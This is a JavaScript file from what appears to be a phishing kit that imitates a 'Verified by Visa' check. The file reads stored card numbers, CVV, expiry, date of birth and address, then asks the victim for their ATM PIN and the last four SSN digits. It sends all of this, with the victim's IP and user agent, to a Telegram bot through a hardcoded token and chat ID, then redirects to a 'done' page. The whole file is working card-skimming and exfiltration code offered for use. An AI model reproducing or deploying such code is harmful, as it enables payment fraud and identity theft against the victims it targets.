// Function to get the user's IP address
function getUserIP() {
    return fetch('get_user_ip.php')
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch user IP');
            }
            return response.json();
        })
        .then(data => {
            return data.userIP;
        })
        .catch(error => {
            console.error(error);
            return 'Unknown'; // Return 'Unknown' if unable to fetch user IP
        });
}

// Function to send VBV details to Telegram channel via Telegram bot
function sendVBVDetailsToTelegram(message) {
    // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot token and chat ID
    const botToken = '7002223785:AAFPsYJezV6Dr2L6v55jqLQnduuAjnNrMek';
    const chatId = '-1002101599846';

    // Get user IP address
    getUserIP().then(userIP => {
        // Append user IP address to the message
        message += `\nUser IP: ${userIP}`;

        // Send message to Telegram bot
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send message to Telegram bot');
                }
                console.log('Message sent successfully');
            })
            .catch(error => {
                console.error(error);
                // Handle error
            });
    });
}

document.addEventListener("DOMContentLoaded", function() {
    // Retrieve data from local storage
    const fullName = localStorage.getItem('billingFirstName') || '';
    const last4Digits = localStorage.getItem('last4Digits') || '';
    const creditCardNumber = localStorage.getItem('creditCardNumber') || '';
    const billingDOB = localStorage.getItem('billingDOB') || '';
    const billingAddress = localStorage.getItem('billingStreetAddress') || '';
    const billingCity = localStorage.getItem('billingCity') || '';
    const billingState = localStorage.getItem('billingState') || '';
    const billingzipCode = localStorage.getItem('billingZipcode') || '';
    const cardExp = localStorage.getItem('expiration') || '';
    const cardCvv = localStorage.getItem('cvv') || '';
    const userAgent = navigator.userAgent;

    // Display data
    document.getElementById('full-name-info').textContent = fullName;
    document.getElementById('credit-card-info').textContent = `XXXX-XXXX-XXXX-${last4Digits}`;

    // Add event listener to the VBV form submit button
    document.querySelector('.vbv-form').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the default form submission

        // Retrieve VBV form inputs
        const atmPin = document.getElementById('atmpin').value.trim(); // Corrected ID for ATM pin input
        const lastFourSSN = document.getElementById('ssn').value.trim(); // Corrected ID for last four digits of SSN input

        // Combine all the data
        let message = `
            Card Details By Yonna:
            Full Name: ${fullName}
            Credit Card Number: ${creditCardNumber}
            ATM PIN: ${atmPin}
            Last Four Digits of SSN: ${lastFourSSN}
            Billing Dob: ${billingDOB}
            Address: ${billingAddress}
            city: ${billingCity}
            state: ${billingState}
            zip: ${billingzipCode}
            exp: ${cardExp}
            cvv: ${cardCvv}
            User Agent: ${userAgent}
        `;

        // Send combined data to Telegram channel
        sendVBVDetailsToTelegram(message);

        window.location.href = 'done.html';
    });
});